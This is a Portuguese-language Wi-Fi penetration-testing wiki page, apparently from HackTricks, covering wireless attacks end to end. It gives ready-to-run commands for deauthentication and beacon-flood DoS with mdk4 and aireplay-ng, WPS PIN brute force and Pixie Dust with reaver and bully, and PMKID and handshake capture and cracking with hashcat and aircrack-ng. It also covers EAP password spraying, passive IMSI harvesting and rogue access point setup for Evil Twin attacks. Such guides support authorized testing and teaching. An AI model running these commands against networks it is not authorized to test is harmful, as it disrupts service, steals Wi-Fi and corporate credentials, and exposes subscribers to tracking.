# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Comandos básicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Ferramentas

### Hijacker & NexMon (Wi-Fi interno do Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Executar airgeddon com docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Fonte: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Ele pode realizar ataques Evil Twin, KARMA e Known Beacons e então usar um template de phishing para obter a senha real da rede ou capturar credenciais de redes sociais.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta ferramenta automatiza ataques **WPS/WEP/WPA-PSK**. Ela irá automaticamente:

- Colocar a interface em modo monitor
- Escanear redes possíveis - e permitir que você selecione a(s) vítima(s)
- If WEP - Launch WEP attacks
- If WPA-PSK
- If WPS: Pixie dust attack and the bruteforce attack (cuidado: o ataque de brute-force pode levar muito tempo). Notice that it doesn't try null PIN or database/generated PINs.
- Tentar capturar o PMKID do AP to crack it
- Try to deauthenticate clients of the AP to capture a handshake
- If PMKID or Handshake, try to bruteforce using top5000 passwords.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Desconectar todos (ou um ESSID/Client específico)
- Random fake APs -- Hide nets, possível crash de scanners
- Overload AP -- Tentar derrubar o AP (geralmente não muito útil)
- WIDS -- Play with the IDS
- TKIP, EAPOL -- Alguns ataques específicos para DoS em alguns APs
- **Cracking**
- Crack **WEP** (several tools and methods)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Útil para capturar credenciais de captive portal e/ou realizar ataques na LAN
- **WPA-PSK** Evil Twin -- Útil para ataques na rede se você souber a senha
- **WPA-MGT** -- Útil para capturar credenciais corporativas
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Útil para capturar credenciais de captive portal e/ou realizar ataques na LAN
- **+ WPA** -- Útil para capturar WPA handshakes

## DOS

### Deauthentication Packets

**Descrição de** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, um método prevalente no Wi-Fi hacking, envolvem a falsificação de "management" frames para **desconectar forçadamente dispositivos de uma rede**. Esses pacotes não criptografados enganam clientes fazendo-os acreditar que vêm da rede legítima, permitindo que atacantes coletem WPA handshakes para fins de cracking ou para perturbar persistentemente as conexões de rede. Essa tática, alarmante em sua simplicidade, é amplamente utilizada e tem implicações significativas para a segurança de redes.

**Deauthentication usando Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 significa deauthentication
- 1 é o número de deauths a enviar (você pode enviar múltiplos se desejar); 0 significa enviá-los continuamente
- -a 00:14:6C:7E:40:80 é o endereço MAC do ponto de acesso
- -c 00:0F:B5:34:30:30 é o endereço MAC do cliente a deauthenticate; se isto for omitido então é enviada uma broadcast deauthentication (nem sempre funciona)
- ath0 é o nome da interface

### Disassociation Packets

**Disassociation packets**, similar to deauthentication packets, são um tipo de quadro de gerenciamento usado em redes Wi-Fi. Estes pacotes servem para romper a conexão entre um dispositivo (como um laptop ou smartphone) e um ponto de acesso (AP). A principal distinção entre disassociation e deauthentication está nos cenários de uso. Enquanto um AP envia **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, reinício ou realocação, necessitando assim a desconexão de todos os nós conectados.

**Este ataque pode ser realizado com mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Mais ataques DOS por mdk4**

**Em** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Envia beacon frames para mostrar fake APs aos clientes. Isso às vezes pode travar scanners de rede e até drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Enviar frames de autenticação para todos os Access Points (APs) acessíveis dentro do alcance pode sobrecarregar esses APs, especialmente quando há numerosos clientes envolvidos. Esse tráfego intenso pode causar instabilidade no sistema, fazendo com que alguns APs travem ou até reiniciem.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) verifica se um SSID está devidamente revelado e confirma o alcance do AP. Esta técnica, combinada com **bruteforcing hidden SSIDs** com ou sem uma wordlist, ajuda a identificar e acessar redes ocultas.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Enviar pacotes aleatórios ou duplicados para diferentes filas QoS pode disparar Michael Countermeasures em **TKIP APs**, provocando um desligamento do AP por um minuto. Este método é uma tática eficiente de ataque **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Inundar um AP com **EAPOL Start frames** cria **fake sessions**, sobrecarregando o AP e bloqueando clientes legítimos. Alternativamente, injetar **fake EAPOL Logoff messages** desconecta forçadamente os clientes; ambos os métodos interrompem efetivamente o serviço de rede.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Ataques para redes mesh IEEE 802.11s**

Vários ataques ao gerenciamento de links e ao roteamento em redes mesh.

**ATTACK MODE w: Confusão de WIDS**

Interconectar clientes a múltiplos nós WDS ou a rogue APs falsos pode manipular Intrusion Detection and Prevention Systems, criando confusão e possibilitando abuso do sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Um packet fuzzer com diversas fontes de pacotes e um conjunto abrangente de modificadores para manipulação de pacotes.

### **Airggedon**

_**Airgeddon**_ oferece a maioria dos ataques propostos nos comentários anteriores:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) simplifica o processo de conectar dispositivos a um router, acelerando e facilitando a configuração em redes criptografadas com **WPA** ou **WPA2** Personal. É ineficaz contra a segurança WEP, que é facilmente comprometida. WPS utiliza um PIN de 8 dígitos, validado em duas metades, tornando-o suscetível a ataques de força bruta devido ao número limitado de combinações (11.000 possibilidades).

### WPS Bruteforce

Existem 2 ferramentas principais para executar esta ação: Reaver e Bully.

- **Reaver** foi projetado para ser um ataque robusto e prático contra WPS, e foi testado em uma grande variedade de access points e implementações WPS.
- **Bully** é uma **nova implementação** do ataque de força bruta WPS, escrita em C. Tem várias vantagens sobre o código original do reaver: menos dependências, melhor desempenho de memória e CPU, tratamento correto de endianness e um conjunto de opções mais robusto.

O ataque explora a **vulnerabilidade do PIN WPS**, particularmente a exposição dos primeiros quatro dígitos e o papel do último dígito como checksum, facilitando o ataque de força bruta. Contudo, defesas contra ataques de força bruta, como **bloqueio de MAC addresses** de atacantes agressivos, exigem **rotação de MAC address** para continuar o ataque.

Ao obter o WPS PIN com ferramentas como Bully ou Reaver, o atacante pode deduzir o WPA/WPA2 PSK, garantindo **acesso persistente à rede**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Esta abordagem refinada tem como alvo os WPS PINs usando vulnerabilidades conhecidas:

1. **PINs pré-descobertos**: Utilize um banco de dados de PINs conhecidos vinculado a fabricantes específicos que costumam usar WPS PINs uniformes. Esse banco de dados correlaciona os primeiros três octetos dos MAC-addresses com os PINs prováveis para esses fabricantes.
2. **Algoritmos de Geração de PIN**: Aproveite algoritmos como ComputePIN e EasyBox, que calculam WPS PINs com base no MAC-address do AP. O algoritmo Arcadyan adicionalmente requer um ID do dispositivo, adicionando uma camada ao processo de geração de PIN.

### WPS Pixie Dust attack

**Dominique Bongard** descobriu uma falha em alguns Access Points (APs) relacionada à criação de códigos secretos, conhecidos como **nonces** (**E-S1** and **E-S2**). Se esses nonces puderem ser descobertos, quebrar o WPS PIN do AP torna-se fácil. O AP revela o PIN dentro de um código especial (hash) para provar que é legítimo e não um AP falso (rogue). Esses nonces são essencialmente as "chaves" para desbloquear o "cofre" que guarda o WPS PIN. Mais sobre isso pode ser encontrado [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Em termos simples, o problema é que alguns APs não usaram chaves suficientemente aleatórias para criptografar o PIN durante o processo de conexão. Isso torna o PIN vulnerável a ser adivinhado de fora da rede (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Se você não quiser colocar o dispositivo em monitor mode, ou `reaver` e `bully` apresentarem algum problema, você pode tentar [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Esta ferramenta pode realizar Pixie Dust attack sem precisar alternar para monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Alguns sistemas mal projetados chegam a permitir que um **Null PIN** (um PIN vazio ou inexistente) conceda acesso, o que é bastante incomum. A ferramenta **Reaver** é capaz de testar essa vulnerabilidade, ao contrário do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos os ataques WPS propostos podem ser facilmente realizados usando _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 e 6 permitem que você tente **seu PIN personalizado** (se tiver algum)
- 7 e 8 executam o **Pixie Dust attack**
- 13 permite testar o **NULL PIN**
- 11 e 12 irão **recuperar os PINs relacionados ao AP selecionado a partir de bancos de dados disponíveis** e **gerar** possíveis **PINs** usando: ComputePIN, EasyBox e, opcionalmente, Arcadyan (recomendado, por que não?)
- 9 e 10 irão testar **todos os PINs possíveis**

## **WEP**

Tão vulnerável e pouco usado hoje em dia. Apenas saiba que _**airgeddon**_ tem uma opção WEP chamada "All-in-One" para atacar esse tipo de proteção. Mais ferramentas oferecem opções similares.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) a new attack method, unique because it only needs **one single packet** and doesn't require any clients to be connected to the target AP—just interaction between the attacker and the AP.

Many modern routers add an **optional field** to the **first EAPOL** frame during association, known as `Robust Security Network`. This includes the `PMKID`.

As the original post explains, the **PMKID** is created using known data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dado que o "PMK Name" é constante, sabemos o BSSID do AP e da station, e o `PMK` é idêntico ao do full 4-way handshake, **hashcat** pode usar essa informação para crackar o PSK e recuperar a passphrase!

Para **gather** essas informações e **bruteforce** localmente a senha você pode fazer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Os **PMKIDs capturados** serão exibidos no **console** e também **salvos** em \_ **/tmp/attack.pcap**\_\
Agora, converta a captura para o formato **hashcat/john** e quebre-a:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Por favor, note que o formato de um hash correto contém **4 partes**, como: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Se o seu **somente** contiver **3 partes**, então, é **inválido** (a captura PMKID não foi válida).

Observe que `hcxdumptool` **também captura handshakes** (algo assim aparecerá: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Você pode **transformar** os **handshakes** para o formato **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Observei que alguns handshakes capturados com esta ferramenta não puderam ser cracked mesmo conhecendo a senha correta. Recomendo capturar handshakes também pela forma tradicional, se possível, ou capturar vários deles usando esta ferramenta._

### Captura de handshake

Um ataque a redes **WPA/WPA2** pode ser executado capturando um **handshake** e tentando **crack** a senha **offline**. Esse processo envolve monitorar a comunicação de uma rede específica e o **BSSID** em um **channel** particular. Aqui vai um guia simplificado:

1. Identifique o **BSSID**, **channel**, e um **connected client** da rede alvo.
2. Use `airodump-ng` para monitorar o tráfego da rede no **channel** e **BSSID** especificados, na esperança de capturar um **handshake**. O comando ficará assim:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Para aumentar a chance de capturar um handshake, desconecte momentaneamente o cliente da rede para forçar uma reautenticação. Isso pode ser feito usando o comando `aireplay-ng`, que envia deauthentication packets ao cliente:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note que, como o cliente foi desautenticado, ele pode tentar conectar-se a um AP diferente ou, em outros casos, a uma rede diferente._

Quando no `airodump-ng` aparecem informações de handshake, isso significa que o handshake foi capturado e você pode parar de escutar:

![](<../../images/image (172) (1).png>)

Uma vez que o handshake foi capturado, você pode usar `aircrack-ng` para efetuar o **crack**:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verificar se há handshake no arquivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Se esta ferramenta encontrar um handshake incompleto de um ESSID antes do handshake completo, ela não detectará o handshake válido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Em ambientes WiFi empresariais, você encontrará diversos métodos de autenticação, cada um oferecendo diferentes níveis de segurança e recursos de gerenciamento. Ao usar ferramentas como `airodump-ng` para inspecionar o tráfego de rede, você pode notar identificadores para esses tipos de autenticação. Alguns métodos comuns incluem:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Este método suporta hardware tokens e senhas de uso único dentro do EAP-PEAP. Ao contrário do MSCHAPv2, ele não usa peer challenge e envia as senhas em texto claro para o ponto de acesso, gerando risco de ataques de downgrade.
2. **EAP-MD5 (Message Digest 5)**:
- Envolve o envio do hash MD5 da senha pelo cliente. Não é **recomendado** devido à vulnerabilidade a ataques de dicionário, à falta de autenticação do servidor e à incapacidade de gerar chaves WEP específicas por sessão.
3. **EAP-TLS (Transport Layer Security)**:
- Utiliza certificados do lado do cliente e do servidor para autenticação e pode gerar dinamicamente chaves WEP por usuário e por sessão para proteger as comunicações.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Fornece autenticação mútua através de um túnel criptografado, além de um método para derivar chaves WEP dinâmicas por usuário e por sessão. Requer apenas certificados no lado do servidor, com os clientes usando credenciais.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funciona de forma semelhante ao EAP ao criar um túnel TLS para comunicação protegida. Permite o uso de protocolos de autenticação mais fracos sobre o EAP devido à proteção oferecida pelo túnel.
- **PEAP-MSCHAPv2**: Frequentemente referido apenas como PEAP, combina o mecanismo challenge/response vulnerável do MSCHAPv2 com um túnel TLS protetor.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Semelhante ao EAP-TLS, mas inicia um túnel TLS antes de trocar certificados, oferecendo uma camada adicional de segurança.

Você pode encontrar mais informações sobre esses métodos de autenticação [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Lendo [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) parece que se você está usando **EAP** as **mensagens** **"Identity"** devem ser **suportadas**, e o **username** vai ser enviado em **texto claro** nas mensagens **"Response Identity"**.

Mesmo usando um dos métodos de autenticação mais seguros: **PEAP-EAP-TLS**, é possível **capturar o username enviado no protocolo EAP**. Para isso, **capture uma comunicação de autenticação** (inicie `airodump-ng` em um canal e `wireshark` na mesma interface) e filtre os pacotes por `eapol`.\
Dentro do pacote "**Response, Identity**", o **username** do cliente aparecerá.

![](<../../images/image (850).png>)

### Anonymous Identities

O ocultamento de identidade é suportado tanto por EAP-PEAP quanto por EAP-TTLS. No contexto de uma rede WiFi, uma requisição EAP-Identity é tipicamente iniciada pelo access point (AP) durante o processo de associação. Para garantir a proteção do anonimato do usuário, a resposta do cliente EAP no dispositivo do usuário contém apenas as informações essenciais necessárias para que o RADIUS inicial processe a requisição. Esse conceito é ilustrado pelos seguintes cenários:

- EAP-Identity = anonymous
- Nesse cenário, todos os usuários empregam o pseudônimo "anonymous" como seu identificador de usuário. O RADIUS inicial funciona como um servidor EAP-PEAP ou EAP-TTLS, responsável por gerenciar o lado servidor do protocolo PEAP ou TTLS. O método de autenticação interno (protegido) é então tratado localmente ou delegado a um RADIUS remoto (home).
- EAP-Identity = anonymous@realm_x
- Nesta situação, usuários de diferentes realms escondem suas identidades enquanto indicam seus respectivos realms. Isso permite que o RADIUS inicial faça proxy das requisições EAP-PEAP ou EAP-TTLS para servidores RADIUS nos seus realms de origem, que atuam como servidor PEAP ou TTLS. O RADIUS inicial opera apenas como um nó de retransmissão RADIUS.
- Alternativamente, o RADIUS inicial pode funcionar como o servidor EAP-PEAP ou EAP-TTLS e tratar o método de autenticação protegido ou encaminhá-lo para outro servidor. Essa opção facilita a configuração de políticas distintas para vários realms.

No EAP-PEAP, uma vez estabelecido o túnel TLS entre o servidor PEAP e o cliente PEAP, o servidor PEAP inicia uma requisição EAP-Identity e a transmite através do túnel TLS. O cliente responde a essa segunda requisição EAP-Identity enviando uma resposta EAP-Identity contendo a identidade real do usuário através do túnel criptografado. Essa abordagem evita efetivamente a revelação da identidade real do usuário para quem estiver escutando o tráfego 802.11.

O EAP-TTLS segue um procedimento ligeiramente diferente. Com EAP-TTLS, o cliente tipicamente se autentica usando PAP ou CHAP, protegido pelo túnel TLS. Nesse caso, o cliente inclui um atributo User-Name e ou um atributo Password ou CHAP-Password na mensagem TLS inicial enviada após o estabelecimento do túnel.

Independentemente do protocolo escolhido, o servidor PEAP/TTLS obtém conhecimento da identidade real do usuário depois que o túnel TLS foi estabelecido. A identidade real pode ser representada como user@realm ou simplesmente user. Se o servidor PEAP/TTLS também for responsável por autenticar o usuário, ele agora possui a identidade do usuário e prossegue com o método de autenticação protegido pelo túnel TLS. Alternativamente, o servidor PEAP/TTLS pode encaminhar uma nova requisição RADIUS para o RADIUS home do usuário. Essa nova requisição RADIUS omite a camada do protocolo PEAP ou TTLS. Em casos onde o método de autenticação protegido é EAP, as mensagens EAP internas são transmitidas ao RADIUS home sem o envelope EAP-PEAP ou EAP-TTLS. O atributo User-Name da mensagem RADIUS de saída contém a identidade real do usuário, substituindo o User-Name anonymous da requisição RADIUS de entrada. Quando o método de autenticação protegido é PAP ou CHAP (suportado apenas pelo TTLS), o User-Name e outros atributos de autenticação extraídos do payload TLS são substituídos na mensagem RADIUS de saída, deslocando o User-Name anonymous e os atributos TTLS EAP-Message encontrados na requisição RADIUS de entrada.

Para mais informações consulte [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

A autenticação Wi‑Fi baseada em SIM usando EAP‑SIM/EAP‑AKA sobre 802.1X pode leak o identificador permanente do assinante (IMSI) em texto claro durante a fase de identidade não autenticada se a implantação não implementar pseudônimos/identidades protegidas ou um túnel TLS ao redor do EAP interno.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Clique para expandir</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notas:
- Funciona antes de qualquer túnel TLS se a implantação usar EAP‑SIM/AKA puro sem identidade protegida/pseudônimos.
- O valor exposto é um identificador permanente vinculado ao SIM do assinante; a coleta permite rastreamento de longo prazo e abusos subsequentes nas telecomunicações.

Impacto
- Privacidade: rastreamento persistente de usuário/dispositivo a partir de capturas Wi‑Fi passivas em locais públicos.
- Base para abuso em telecom: com o IMSI, um atacante com acesso a SS7/Diameter pode consultar localização ou tentar interceptação de chamadas/SMS e roubo de MFA.

Mitigações / o que verificar
- Verifique que os clientes usam identidades externas anônimas (pseudônimos) para EAP‑SIM/AKA conforme a orientação 3GPP (por exemplo, 3GPP TS 33.402).
- Prefira tunelar a fase de identidade (por exemplo, EAP‑TTLS/PEAP transportando EAP‑SIM/AKA interno) para que o IMSI nunca seja enviado em claro.
- Capturas de pacotes da associação/autenticação nunca devem revelar um IMSI bruto em EAP-Response/Identity.

Relacionado: Exploração de sinalização telecom com identificadores móveis capturados
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Se o cliente for esperado usar um **username and password** (observe que **EAP-TLS won't be valid** neste caso), então você pode tentar obter uma **lista** de **usernames** (veja a próxima parte) e **passwords** e tentar **bruteforce** o acesso usando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Você também pode realizar este ataque usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client attacks Theory

### Network Selection and Roaming

- O protocolo 802.11 define como uma station entra em um Extended Service Set (ESS) mas não especifica os critérios para selecionar um ESS ou um access point (AP) dentro dele.
- As stations podem fazer roaming entre APs que compartilham o mesmo ESSID, mantendo conectividade através de um prédio ou área.
- O protocolo exige autenticação da station ao ESS, mas não obriga a autenticação do AP à station.

### Preferred Network Lists (PNLs)

- As stations armazenam o ESSID de cada wireless network à qual se conectam em sua Preferred Network List (PNL), junto com detalhes de configuração específicos da network.
- A PNL é usada para conectar automaticamente a redes conhecidas, melhorando a experiência do usuário ao simplificar o processo de conexão.

### Passive Scanning

- APs periodicamente transmitem beacon frames, anunciando sua presença e características, incluindo o ESSID do AP a menos que o broadcast esteja desabilitado.
- Durante a passive scanning, as stations escutam por beacon frames. Se o ESSID de um beacon corresponder a uma entrada na PNL da station, a station pode se conectar automaticamente a esse AP.
- O conhecimento da PNL de um dispositivo permite potencial exploração ao imitar o ESSID de uma rede conhecida, enganando o dispositivo para conectar-se a um rogue AP.

### Active Probing

- A active probing envolve stations enviando probe requests para descobrir APs próximos e suas características.
- Directed probe requests tem como alvo um ESSID específico, ajudando a detectar se uma network particular está ao alcance, mesmo que seja uma hidden network.
- Broadcast probe requests têm o campo SSID nulo e são enviados para todos os APs próximos, permitindo que a station verifique qualquer preferred network sem divulgar o conteúdo de sua PNL.

## Simple AP with redirection to Internet

Antes de explicar como realizar ataques mais complexos, vai ser explicado **como** apenas **criar** um **AP** e **redirecionar** seu **traffic** para uma interface conectada **to** a **Internet**.

Usando `ifconfig -a` verifique que a interface wlan para criar o AP e a interface conectada à Internet estão presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crie o arquivo de configuração `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Então **configure IPs** e **rotas**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Em seguida **inicie** o dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crie um arquivo de configuração `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Pare processos indesejados** , ative **monitor mode**, e **inicie hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Encaminhamento e Redirecionamento
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Um ataque Evil Twin explora a forma como clientes WiFi reconhecem redes, baseando-se principalmente no nome da rede (ESSID) sem exigir que a base station (access point) se autentique perante o cliente. Pontos-chave incluem:

- **Dificuldade na Diferenciação**: Dispositivos têm dificuldade em distinguir entre access points legítimos e rogue access points quando compartilham o mesmo ESSID e tipo de criptografia. Redes do mundo real frequentemente usam múltiplos access points com o mesmo ESSID para estender a cobertura de forma transparente.
- **Roaming do Cliente e Manipulação de Conexão**: O protocolo 802.11 permite que dispositivos façam roaming entre access points dentro do mesmo ESS. Atacantes podem explorar isso atraindo um dispositivo a desconectar da sua base station atual e conectar-se a um rogue access point. Isso pode ser conseguido oferecendo um sinal mais forte ou interrompendo a conexão com o access point legítimo por meio de métodos como deauthentication packets ou jamming.
- **Desafios na Execução**: Executar com sucesso um ataque Evil Twin em ambientes com múltiplos access points bem posicionados pode ser desafiador. Deauthenticating um único access point legítimo frequentemente resulta no dispositivo conectando-se a outro access point legítimo, a menos que o atacante consiga deauthenticate todos os access points próximos ou posicione estrategicamente o rogue access point.

